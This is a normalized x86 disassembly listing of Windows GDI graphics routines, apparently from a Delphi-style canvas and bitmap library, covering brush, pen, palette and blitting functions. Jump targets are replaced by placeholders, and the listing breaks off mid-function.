mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_422a94
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_42383c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423688
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_4236a4
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_423870
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d80
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4240b0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4232ac
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4240d0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423578
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4240f0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41a51c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_423934
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_41a5b8
xor edx edx
mov eax esi
call sub_423ee8
mov eax [ esi + 0xc ]
call sub_40324c
mov eax [ esi + 0x10 ]
call sub_40324c
mov eax [ esi + 0x14 ]
call sub_40324c
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a7b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_423990
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_423f3c
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_423a18
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
mov eax [ ebx + 0x14 ]
call sub_423718
call sub_422a94
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422a94
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_418e04
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_423ac4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
mov eax [ ebx + 0x14 ]
call sub_423754
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_423b00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
mov eax [ ebx + 0x14 ]
call sub_423754
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_423b3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_423b9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_423bc8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_423c00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_423c48
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_423c84
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_40425c
push eax
mov eax edi
call sub_40445c
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_423cc8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_423c84
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_423ce4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_423c84
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_423d04
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_423d50
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d57
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_423b74
sub_423db0
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_423dd4
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_423b9c
pop ecx
pop edx
pop edi
pop esi
retn
sub_423df4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_423e20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_423f3c
mov eax [ ebp + 0x8 ]
call sub_422a94
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_423e88
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_423ee8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_423e88
mov edx esp
mov eax ebx
call sub_423db0
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_423dd4
sub_423f3c
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_423fd8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
test bl 0x8
je r-xdata
mov eax esi
call sub_424004
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_424034
sub_423fd8
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_422f68
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_422a94
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_424004
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_423468
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_424034
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_423754
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_423754
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_423834
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_423718
call sub_422a94
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_423718
call sub_422a94
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_424164
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4241ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241b5
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_4241b8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_424254
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_424164
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_40420c
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42425b
lea eax [ ebp - 0x104 ]
call sub_403f9c
retn
sub_424270
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_4243be
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42432d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4241b8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4241b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243c5
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_4243d0
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_424404
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_424260
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_424684
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424260
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42468b
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424260
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4244d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406d3c
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42468b
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_424698
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_4246d0
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c58
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_424748
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_4247a0
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4029b0
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42489d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248a4
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_4248b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42493e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_424950
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4029b0
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_424748
mov eax esp
call sub_4248b8
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_4249f4
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_424748
mov [ esp ] eax
sub_424a48
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
